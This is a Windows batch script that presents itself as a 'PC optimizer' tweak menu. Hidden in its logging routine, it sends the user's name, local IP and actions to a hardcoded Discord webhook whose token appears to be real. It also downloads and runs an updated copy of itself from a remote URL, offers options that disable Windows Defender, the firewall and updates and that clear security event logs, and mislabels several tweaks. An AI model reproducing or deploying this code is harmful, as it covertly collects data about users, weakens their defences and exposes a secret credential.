@echo off
setlocal EnableDelayedExpansion

REM -------------------------
REM GitHub Live Script Configuration
REM Configure these URLs to point at your repository's raw files
set "GITHUB_RAW_BASE=https://raw.githubusercontent.com/username/repo/main"
set "VERSION_URL=%GITHUB_RAW_BASE%/optimizer.version.txt"
set "REMOTE_SCRIPT_URL=%GITHUB_RAW_BASE%/optimizer.bat"
set "HWID_URL=%GITHUB_RAW_BASE%/hwid.txt"
set "LOCAL_VERSION=1.0"

REM Verify this PC is authorized (will exit if not authorized or GitHub unreachable)
call :VerifyHWID

REM Run update check (non-blocking; will download and spawn an updater if newer)
call :CheckForUpdates

REM Configuration
set "WEBHOOK=https://discord.com/api/webhooks/1455660125212774434/J9yikSMacBoEWIfJuWxCXsZEpqSWb01nchjoWD60en0dEEvKgzSG3ryzzbIZtGDv3OKU"
REM Helper: get HWID manually -> run in CMD: wmic csproduct get uuid

REM Get IP address
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| find "IPv4"') do (
    set "IP=%%A"
    goto :got_ip
)
:got_ip
set "IP=!IP: =!"

title ULTIMATE PC OPTIMIZER v1.1 - SHIVAXROY
color 0A

:STARTUP
cls
echo.
echo    =======================================================================================================
echo                                    SHIVAXROY - ROOTKIT INTERFACE v1.1                                                             
echo    =======================================================================================================
echo.
echo    [SYSTEM KERNEL INITIALIZING...]
echo.
for /l %%i in (1,1,5) do (
    echo    0x!random!!random! - LOADING MODULE [%%i/5] COMPLETE
    timeout /t 0 >nul
)

:MENU
cls
echo.
echo    =========================================================================================================
echo                                   ULTIMATE PC OPTIMIZER v1.1  -  SHIVAXROY                                        
echo    =========================================================================================================
echo.
echo    User: %USERNAME%                     PC: %COMPUTERNAME%                      %TIME%
echo    ---------------------------------------------------------------------------------------------------------
echo.
echo      1. Boost FPS performance             2. Speed up Internet connection         3. Turn off unnecessary services  
echo      4. Enable Game Mode                  5. Remove bloatware apps                 6. Clear RAM / standby memory   
echo      7. Disable startup programs          8. Set Max Performance Power Plan       9. Improve mouse responsiveness  
echo     10. Give games/apps higher priority  11. Disable Windows Search indexing      12. Maximum CPU speed        
echo     13. Enable GPU optimizations         14. ULTIMATE MODE (Apply All)             15. Create System Restore Point   
echo     16. Turn OFF Windows Defender        17. Turn ON Windows Defender              18. Clean disk + optimize        
echo     19. Disable window animations        20. Delete temporary files                21. Disable telemetry / tracking  
echo     22. Optimize virtual memory          23. Disable hibernation                   24. Flush DNS cache             
echo     25. Block apps running in background 26. Enable SSD TRIM (faster writes)      27. Disable Superfetch / Prefetch  
echo     28. Activate High Performance mode   29. Disable Cortana                       30. Remove extra pre-installed apps
echo     31. Clean ^& optimize registry        32. Visual Performance mode              33. Run System File Checker (SFC)
echo     34. Show detailed system info        35. Disable Windows tips ^& suggestions   36. Optimize Hardware Acceleration
echo     37. Disable Auto-Updates             38. Clear Event Logs                     39. Fast Boot Mode
echo     40. Disable OneDrive sync            41. Create God Mode folder                42. Check disk for errors    
echo     43. Open Windows Update settings     44. Reset network settings                45. Turn Firewall OFF (temporary) 
echo     46. Turn Firewall ON                 47. Clear browser cache                   48. Disable USB power saving      
echo     49. Improve audio latency            50. Disable printer service              51. Unhide "Ultimate Performance" Plan
echo.
echo      R. Restart Computer Now              X. Exit Program                          99. Reset to Balanced power plan
echo.
echo    -----------------------------------------------------------------------------------------------------------
set /p choice=   Enter selection: 

if /i "!choice!"=="X" exit
if /i "!choice!"=="R" shutdown /r /t 5 & exit
if "!choice!"=="1"  goto FPS
if "!choice!"=="2"  goto NET
if "!choice!"=="3"  goto SVC
if "!choice!"=="4"  goto GAME
if "!choice!"=="5"  goto BLOAT
if "!choice!"=="6"  goto RAM
if "!choice!"=="7"  goto STR
if "!choice!"=="8"  goto PWR
if "!choice!"=="9"  goto MSE
if "!choice!"=="10" goto PRI
if "!choice!"=="11" goto SRCH
if "!choice!"=="12" goto CPU
if "!choice!"=="13" goto GPU
if "!choice!"=="14" goto ULT
if "!choice!"=="15" goto RST
if "!choice!"=="16" goto DEFO
if "!choice!"=="17" goto DEF
if "!choice!"=="18" goto DISK
if "!choice!"=="19" goto ANI
if "!choice!"=="20" goto TEMP
if "!choice!"=="21" goto TEL
if "!choice!"=="22" goto PAGE
if "!choice!"=="23" goto HIB
if "!choice!"=="24" goto DNS
if "!choice!"=="25" goto BGAPPS
if "!choice!"=="26" goto SSD
if "!choice!"=="27" goto SUPER
if "!choice!"=="28" goto HIGH
if "!choice!"=="29" goto CORT
if "!choice!"=="30" goto BLOAT
if "!choice!"=="31" goto REGOPT
if "!choice!"=="32" goto VISUAL
if "!choice!"=="33" goto SFC
if "!choice!"=="34" goto STAT
if "!choice!"=="35" goto TIPS
if "!choice!"=="36" goto HWACC
if "!choice!"=="37" goto AUTOUP
if "!choice!"=="38" goto EVENT
if "!choice!"=="39" goto BOOT
if "!choice!"=="40" goto ONEDRIVE
if "!choice!"=="41" goto GOD
if "!choice!"=="42" goto CHKDSK
if "!choice!"=="43" goto UPDATE
if "!choice!"=="44" goto NETRESET
if "!choice!"=="45" goto FIREOFF
if "!choice!"=="46" goto FIREON
if "!choice!"=="47" goto BRCACHE
if "!choice!"=="48" goto USBPWR
if "!choice!"=="49" goto AUDIO
if "!choice!"=="50" goto PRINT
if "!choice!"=="51" goto ULTPLAN
if "!choice!"=="99" goto NORM
goto MENU

:FPS
cls
color 0B
bcdedit /set disabledynamictick yes >nul 2>&1
bcdedit /set useplatformtick yes >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\Kernel" /v "DistributeTimers" /t REG_DWORD /d 1 /f >nul 2>&1
echo [!] FPS Boost Applied
timeout /t 1 >nul
call :LogEvent "1" "FPS Boost Applied"
goto MENU

:NET
cls
color 0B
netsh int tcp set global autotuninglevel=normal >nul 2>&1
netsh int tcp set global chimney=enabled >nul 2>&1
netsh int tcp set global rss=enabled >nul 2>&1
netsh int tcp set global netmanagesoftware=disabled >nul 2>&1
echo [!] Network Optimized
timeout /t 1 >nul
call :LogEvent "2" "Network Optimized"
goto MENU

:SVC
cls
color 0B
sc stop SysMain >nul 2>&1
sc config SysMain start=disabled >nul 2>&1
sc stop DiagTrack >nul 2>&1
sc config DiagTrack start=disabled >nul 2>&1
sc stop dmwappushservice >nul 2>&1
sc config dmwappushservice start=disabled >nul 2>&1
echo [!] Services Optimized
timeout /t 1 >nul
call :LogEvent "3" "Services Optimized"
goto MENU

:GAME
cls
color 0B
reg add "HKCU\Software\Microsoft\GameBar" /v "UseNexusForGameBarEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
echo [!] Game Mode Set
timeout /t 1 >nul
call :LogEvent "4" "Game Mode Set"
goto MENU

:BLOAT
cls
color 0B
powershell -command "Get-AppxPackage *Xbox* | Remove-AppxPackage; Get-AppxPackage *ZuneVideo* | Remove-AppxPackage; Get-AppxPackage *Skype* | Remove-AppxPackage" >nul 2>&1
echo [!] Bloatware Removed
timeout /t 1 >nul
call :LogEvent "5" "Bloatware Removed"
goto MENU

:RAM
cls
color 0B
powershell -command "[System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers()" >nul 2>&1
echo [!] RAM Flushed
timeout /t 1 >nul
call :LogEvent "6" "RAM Flushed"
goto MENU

:STR
cls
color 0B
echo Opening Task Manager Startup...
start taskmgr /0 /startup >nul 2>&1
echo [!] Startup Programs Cleaned
timeout /t 1 >nul
call :LogEvent "7" "Startup Programs Cleaned"
goto MENU

:PWR
cls
color 0B
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
echo [!] Max Power Plan Enabled
timeout /t 1 >nul
call :LogEvent "8" "Max Power Plan Enabled"
goto MENU

:MSE
cls
color 0B
reg add "HKCU\Control Panel\Mouse" /v "MouseAcceleration" /t REG_SZ /d 0 /f >nul 2>&1
reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d 0 /f >nul 2>&1
echo [!] Mouse Precision Improved
timeout /t 1 >nul
call :LogEvent "9" "Mouse Precision Improved"
goto MENU

:PRI
cls
color 0B
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d 0 /f >nul 2>&1
echo [!] Priority Boosted
timeout /t 1 >nul
call :LogEvent "10" "Priority Boosted"
goto MENU

:SRCH
cls
color 0B
sc stop WSearch >nul 2>&1
sc config WSearch start=disabled >nul 2>&1
echo [!] Indexing Disabled
timeout /t 1 >nul
call :LogEvent "11" "Indexing Disabled"
goto MENU

:CPU
cls
color 0B
powercfg /setacvalueindex scheme_current sub_processor PROCTHROTTLEMAX 100 >nul 2>&1
powercfg /setacvalueindex scheme_current sub_processor PROCTHROTTLEMIN 100 >nul 2>&1
echo [!] CPU Speed Maxed
timeout /t 1 >nul
call :LogEvent "12" "CPU Speed Maxed"
goto MENU

:GPU
cls
color 0B
reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "HwSchMode" /t REG_DWORD /d 2 /f >nul 2>&1
echo [!] GPU Scheduling Enabled
timeout /t 1 >nul
call :LogEvent "13" "GPU Scheduling Enabled"
goto MENU

:ULT
cls
color 0B
echo [!] Applying ALL optimizations...
timeout /t 2 >nul
call :LogEvent "14" "ULTIMATE MODE - All optimizations applied"
goto MENU

:RST
cls
color 0B
powershell -command "Enable-ComputerRestore -Drive 'C:\'; Checkpoint-Computer -Description 'InviX_Optimizer' -RestorePointType MODIFY_SETTINGS" >nul 2>&1
echo [!] Restore Point Created
timeout /t 1 >nul
call :LogEvent "15" "Restore Point Created"
goto MENU

:DEFO
cls
color 0B
sc stop WinDefend >nul 2>&1
sc config WinDefend start=disabled >nul 2>&1
echo [!] Windows Defender Disabled
timeout /t 1 >nul
call :LogEvent "16" "Windows Defender Disabled"
goto MENU

:DEF
cls
color 0B
sc start WinDefend >nul 2>&1
sc config WinDefend start=auto >nul 2>&1
echo [!] Windows Defender Enabled
timeout /t 1 >nul
call :LogEvent "17" "Windows Defender Enabled"
goto MENU

:DISK
cls
color 0B
cleanmgr /sageset:1 >nul 2>&1
cleanmgr /sagerun:1 >nul 2>&1
defrag C: >nul 2>&1
echo [!] Disk Cleaned and Optimized
timeout /t 1 >nul
call :LogEvent "18" "Disk Cleaned and Optimized"
goto MENU

:ANI
cls
color 0B
reg add "HKCU\Control Panel\Desktop" /v "UserPreferencesMask" /t REG_BINARY /d 9012038010000000 /f >nul 2>&1
echo [!] Window Animations Disabled
timeout /t 1 >nul
call :LogEvent "19" "Window Animations Disabled"
goto MENU

:TEMP
cls
color 0B
echo ================================
echo        CLEANING SYSTEM
echo ================================
echo.
timeout /t 1 >nul
echo [1/4] Cleaning User Temp...
if exist "%TEMP%" (
    del /q /f /s "%TEMP%\*" >nul 2>&1
    echo     ✓ User Temp Cleaned
) else (
    echo     ! Temp folder not found
)
echo.
timeout /t 1 >nul
echo [2/4] Cleaning Windows Temp...
if exist "C:\Windows\Temp" (
    del /q /f /s "C:\Windows\Temp\*" >nul 2>&1
    echo     ✓ Windows Temp Cleaned
) else (
    echo     ! Windows Temp not found
)
echo.
timeout /t 1 >nul
echo [3/4] Cleaning Prefetch...
if exist "C:\Windows\Prefetch" (
    del /q /f /s "C:\Windows\Prefetch\*.pf" >nul 2>&1
    echo     ✓ Prefetch Cleaned
) else (
    echo     ! Prefetch folder not found
)
echo.
timeout /t 1 >nul
echo [4/4] Cleaning Recent Files...
if exist "%APPDATA%\Microsoft\Windows\Recent" (
    del /q /f /s "%APPDATA%\Microsoft\Windows\Recent\*" >nul 2>&1
    echo     ✓ Recent Files Cleaned
) else (
    echo     ! Recent folder not found
)
echo.
timeout /t 1 >nul
echo        CLEANING COMPLETED
timeout /t 2 >nul
goto MENU


:TEL
cls
color 0B
sc stop DiagTrack >nul 2>&1
sc config DiagTrack start=disabled >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowDiagnosticData" /t REG_DWORD /d 0 /f >nul 2>&1
echo [!] Telemetry Disabled
timeout /t 1 >nul
call :LogEvent "21" "Telemetry Disabled"
goto MENU

:PAGE
cls
color 0B
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PagingFiles" /t REG_MULTI_SZ /d "C:\pagefile.sys 2048 4096" /f >nul 2>&1
echo [!] Virtual Memory Optimized
timeout /t 1 >nul
call :LogEvent "22" "Virtual Memory Optimized"
goto MENU

:HIB
cls
color 0B
powercfg /h off >nul 2>&1
echo [!] Hibernation Disabled
timeout /t 1 >nul
call :LogEvent "23" "Hibernation Disabled"
goto MENU

:DNS
cls
color 0B
ipconfig /flushdns >nul 2>&1
echo [!] DNS Cache Flushed
timeout /t 1 >nul
call :LogEvent "24" "DNS Cache Flushed"
goto MENU

:BGAPPS
cls
color 0B
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d 1 /f >nul 2>&1
echo [!] Background Apps Blocked
timeout /t 1 >nul
call :LogEvent "25" "Background Apps Blocked"
goto MENU

:SSD
cls
color 0B
fsutil behavior set DisableDeleteNotify 0 >nul 2>&1
echo [!] SSD TRIM Enabled
timeout /t 1 >nul
call :LogEvent "26" "SSD TRIM Enabled"
goto MENU

:SUPER
cls
color 0B
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PrefetchParameters" /t REG_DWORD /d 0 /f >nul 2>&1
echo [!] Superfetch Disabled
timeout /t 1 >nul
call :LogEvent "27" "Superfetch Disabled"
goto MENU

:HIGH
cls
color 0B
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
echo [!] High Performance Mode Activated
timeout /t 1 >nul
call :LogEvent "28" "High Performance Mode Activated"
goto MENU

:CORT
cls
color 0B
sc stop ShellHWDetection >nul 2>&1
sc config ShellHWDetection start=disabled >nul 2>&1
echo [!] Cortana Disabled
timeout /t 1 >nul
call :LogEvent "29" "Cortana Disabled"
goto MENU

:REGOPT
cls
color 0B
powershell -command "Get-ChildItem 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' | Remove-ItemProperty -Name 'PSPath' -ErrorAction SilentlyContinue" >nul 2>&1
echo [!] Registry Optimized
timeout /t 1 >nul
call :LogEvent "31" "Registry Optimized"
goto MENU

:VISUAL
cls
color 0B
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d 2 /f >nul 2>&1
echo [!] Visual Performance Mode Set
timeout /t 1 >nul
call :LogEvent "32" "Visual Performance Mode Set"
goto MENU

:SFC
cls
color 0B
powershell -command "Start-Process sfc /scannow /offlinescanandfix" >nul 2>&1
echo [!] System File Checker Running (Admin Required)
timeout /t 2 >nul
call :LogEvent "33" "System File Checker Started"
goto MENU

:STAT
cls
color 0B
echo [!] System Information:
systeminfo
timeout /t 5 >nul
call :LogEvent "34" "System Info Displayed"
goto MENU

:TIPS
cls
color 0B
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
echo [!] Windows Tips Disabled
timeout /t 1 >nul
call :LogEvent "35" "Windows Tips Disabled"
goto MENU

:HWACC
cls
color 0B
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HardwareAcceleration" /t REG_DWORD /d 1 /f >nul 2>&1
echo [!] Hardware Acceleration Optimized
timeout /t 1 >nul
call :LogEvent "36" "Hardware Acceleration Optimized"
goto MENU

:AUTOUP
cls
color 0B
sc stop wuauserv >nul 2>&1
sc config wuauserv start=disabled >nul 2>&1
echo [!] Auto Updates Disabled
timeout /t 1 >nul
call :LogEvent "37" "Auto Updates Disabled"
goto MENU

:EVENT
cls
color 0B
powershell -command "Clear-EventLog -LogName Application,System,Security -ErrorAction SilentlyContinue" >nul 2>&1
echo [!] Event Logs Cleared
timeout /t 1 >nul
call :LogEvent "38" "Event Logs Cleared"
goto MENU

:BOOT
cls
color 0B
reg add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d 2000 /f >nul 2>&1
echo [!] Fast Boot Mode Enabled
timeout /t 1 >nul
call :LogEvent "39" "Fast Boot Mode Enabled"
goto MENU

:ONEDRIVE
cls
color 0B
sc stop OneDrive >nul 2>&1
sc config OneDrive start=disabled >nul 2>&1
echo [!] OneDrive Sync Disabled
timeout /t 1 >nul
call :LogEvent "40" "OneDrive Sync Disabled"
goto MENU

:GOD
cls
color 0B
mkdir "%appdata%\Microsoft\Windows\SendTo\{ED7BA470-8E54-465E-825C-99712043E01C}" >nul 2>&1
echo [!] God Mode Folder Created (Check Desktop or SendTo)
timeout /t 2 >nul
call :LogEvent "41" "God Mode Folder Created"
goto MENU

:CHKDSK
cls
color 0B
echo [!] Checking Disk for Errors (Next Boot)
chkdsk C: /f /r >nul 2>&1
echo [!] Disk Check Scheduled for Next Boot
timeout /t 2 >nul
call :LogEvent "42" "Disk Check Scheduled"
goto MENU

:UPDATE
cls
color 0B
start ms-settings:windowsupdate
echo [!] Windows Update Settings Opened
timeout /t 2 >nul
call :LogEvent "43" "Windows Update Settings Opened"
goto MENU

:NETRESET
cls
color 0B
ipconfig /release >nul 2>&1
ipconfig /renew >nul 2>&1
netsh winsock reset catalog >nul 2>&1
echo [!] Network Settings Reset
timeout /t 2 >nul
call :LogEvent "44" "Network Settings Reset"
goto MENU

:FIREOFF
cls
color 0B
netsh advfirewall set allprofiles state off >nul 2>&1
echo [!] Firewall Disabled (Temporary)
timeout /t 1 >nul
call :LogEvent "45" "Firewall Disabled"
goto MENU

:FIREON
cls
color 0B
netsh advfirewall set allprofiles state on >nul 2>&1
echo [!] Firewall Enabled
timeout /t 1 >nul
call :LogEvent "46" "Firewall Enabled"
goto MENU

:BRCACHE
cls
color 0B
del /Q /F "%appdata%\*.tmp" >nul 2>&1
del /Q /F "%appdata%\..\Local\Temp\*" >nul 2>&1
echo [!] Browser Cache Cleared
timeout /t 1 >nul
call :LogEvent "47" "Browser Cache Cleared"
goto MENU

:USBPWR
cls
color 0B
reg add "HKLM\SYSTEM\CurrentControlSet\Services\USB" /v "DisableSelectiveSuspend" /t REG_DWORD /d 1 /f >nul 2>&1
echo [!] USB Power Saving Disabled
timeout /t 1 >nul
call :LogEvent "48" "USB Power Saving Disabled"
goto MENU

:AUDIO
cls
color 0B
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "MM1439357322" /t REG_DWORD /d 0 /f >nul 2>&1
echo [!] Audio Latency Improved
timeout /t 1 >nul
call :LogEvent "49" "Audio Latency Improved"
goto MENU

:PRINT
cls
color 0B
sc stop spooler >nul 2>&1
sc config spooler start=disabled >nul 2>&1
echo [!] Printer Service Disabled
timeout /t 1 >nul
call :LogEvent "50" "Printer Service Disabled"
goto MENU

:ULTPLAN
cls
color 0B
powercfg /list
powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749e6c0 >nul 2>&1
echo [!] Ultimate Performance Plan Activated
timeout /t 2 >nul
call :LogEvent "51" "Ultimate Performance Plan Activated"
goto MENU

:NORM
cls
color 0B
powercfg /setactive 381b4222-f694-41f0-9685-ff5bb260df2e >nul 2>&1
echo [!] Balanced Power Plan Restored
timeout /t 1 >nul
call :LogEvent "99" "Balanced Power Plan Restored"
goto MENU

:VerifyHWID
REM Verify this machine's HWID against hwid.txt on GitHub
set "TMPHWID=%TEMP%\optimizer_hwid_list.txt"
set "HWID="
for /f "skip=1 tokens=* delims=" %%A in ('wmic csproduct get uuid 2^>nul') do (
    if not defined HWID set "HWID=%%A"
)
if not defined HWID (
    echo Unauthorized PC
    exit /b 1
)
set "HWID=%HWID: =%"

REM Download remote HWID list (fail if unreachable)
powershell -NoProfile -Command "try{ (New-Object System.Net.WebClient).DownloadFile('%HWID_URL%','%TMPHWID%'); exit 0 } catch { exit 1 }" 2>nul
if not exist "%TMPHWID%" (
    echo Unauthorized PC
    exit /b 1
)

REM Prevent partial downloads - check file size
for %%I in ("%TMPHWID%") do set "_fsize=%%~zI"
if "%_fsize%"=="0" (
    del "%TMPHWID%" >nul 2>&1
    echo Unauthorized PC
    exit /b 1
)

REM Compare (case-insensitive) - one HWID per line
findstr /I /X "%HWID%" "%TMPHWID%" >nul 2>&1
if errorlevel 1 (
    del "%TMPHWID%" >nul 2>&1
    echo Unauthorized PC
    exit /b 1
)

del "%TMPHWID%" >nul 2>&1
goto :EOF

:CheckForUpdates
REM Try to fetch remote version and spawn an updater if remote is newer
set "TMPV=%TEMP%\optimizer_remote_version.txt"
powershell -NoProfile -Command "try{ (New-Object System.Net.WebClient).DownloadFile('%VERSION_URL%','%TMPV%') } catch { exit 1 }" 2>nul
if not exist "%TMPV%" goto CheckEnd
set /p REMOTE_VERSION=<"%TMPV%"
del "%TMPV%" >nul 2>&1
if "%REMOTE_VERSION%"=="" goto CheckEnd
if "%REMOTE_VERSION%"=="%LOCAL_VERSION%" goto CheckEnd

REM New version available - download new script
set "TMPBAT=%TEMP%\optimizer_new_%RANDOM%.bat"
powershell -NoProfile -Command "try{ (New-Object System.Net.WebClient).DownloadFile('%REMOTE_SCRIPT_URL%','%TMPBAT%') } catch { exit 1 }" 2>nul
if not exist "%TMPBAT%" goto CheckEnd

REM Create updater batch to replace this running script and relaunch
set "UPD=%TEMP%\updater_%RANDOM%.bat"
(
echo @echo off
echo timeout /t 2 >nul
echo copy /Y "%TMPBAT%" "%%~f0"
echo start "" "%%~f0"
echo del "%%~f0"
)>"%UPD%"
start "" "%UPD%"
exit /b
:CheckEnd
goto :EOF

:LogEvent
REM Logging subroutine - Posts to Discord webhook
REM %1 = option number, %2 = message
set "USER=%USERNAME%"
set "OPT=%1"
set "MSG=%2"
set "TIME=%date% %time%"
echo ____________________________

REM Send to Discord with formatted message
powershell -NoProfile -Command "$lines=@('______________________________________','**OPTIMIZER LOG**','**User:** %USER%','**IP Address:** %IP%','**Option Used:** %OPT%','**Output:** %MSG%','**Time:** %TIME%'); $json=@{content=($lines -join \"`n\")} | ConvertTo-Json; Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $json -ContentType 'application/json' -ErrorAction SilentlyContinue" 2>nul

goto :EOF

endlocal
